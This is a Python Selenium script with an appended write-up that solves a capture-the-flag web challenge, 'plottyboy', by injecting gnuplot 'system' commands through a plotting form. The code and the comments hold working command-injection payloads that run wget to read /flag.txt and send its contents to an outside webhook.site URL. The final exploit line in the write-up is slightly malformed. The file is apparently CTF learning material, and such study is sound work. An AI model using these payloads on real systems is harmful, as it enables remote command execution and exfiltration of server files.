from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import urllib.parse
from pyvirtualdisplay import Display
import time

# Open a virtual windows
display = Display(visible=0, size=(800, 600))
display.start()

# Open a webhook page and take the url
webook_monitor = 'https://webhook.site'
webhook_driver = webdriver.Chrome()
webhook_driver.get(webook_monitor)
webhook = webhook_driver.current_url.replace('#!/', '')

# Open challenge's page
url = 'http://plottyboy.challs.cyberchallenge.it/'
driver = webdriver.Chrome()
driver.get(url)

# Find input form and send the payload
plot = driver.find_element(By.NAME, 'data')
plot.send_keys('x**2; system "wget ' + webhook + '/$(cat /flag.txt)')
enter = driver.find_element(By.XPATH, '/html/body/section/div[2]/form/div[2]/input')
enter.click()

# Wait the response
time.sleep(3)

# Find the flag into page source
page = webhook_driver.page_source
flag = page[page.find('CCIT'):page.find('%7D') + 3]
flag = urllib.parse.unquote(flag)
print(flag)

# Close all virtual windows
driver.close()
webhook_driver.close()

# SOLUTION:
# x**2; system "wget --post-data=$(cat /flag.txt) [WEBHOOK URL]"

# WRITE UP #################################################################################
#  
# FOOTPRINTING
# -----------------------------------------------------------------------------------------
# Opening the url we can see a textarea where we can write some text and note that tiping 
# characters the web server send us nothing, while tiping number or expression, it send a 
# plot of our function, for example you can try with x**2.
# Looking into network section of the browser inspector, after we have introduced a valid
# expression, we can see that the sent file is called "pyGnuPlot_out.png" by the web server,
# so we can say that under the hood there is a gnuplot wrapper in a python server, infact
# requesting the header you can read in an entry "Server : gunicorn", which is a python 
# based webserver.
# EXPLOITING
# -----------------------------------------------------------------------------------------
# Taking in mind that we are working with gnuplot and doing a google research, we discover
# that gnuplot can execute arbitrary commands using the builtin function "system".
# However we have to concatenate 2 commands because the web server won't respond if we don't
# inject a valid function.
# To concatenate 2 gnuplot commands we can use semicolums like a common shell.
# So the exploit will be similar to this:
#
#                        [VALID FUNCTION];system"[ARBITRARY COMMAND]"
# 
# Now the exploiting became very trivial. We can use a command like wget or curl to do a
# post request to a specific public ip we can access, for example webhook.site.
# We need use the "--post-file=[FILE]" argument to send the flag to our webhook url.
# The final exploit is:
#
#            [VALID FUNCTION];system"wget --post-file=$(cat /flag.txt [WEBHOOK URL]"
# ------------------------------------------------------------------------------------------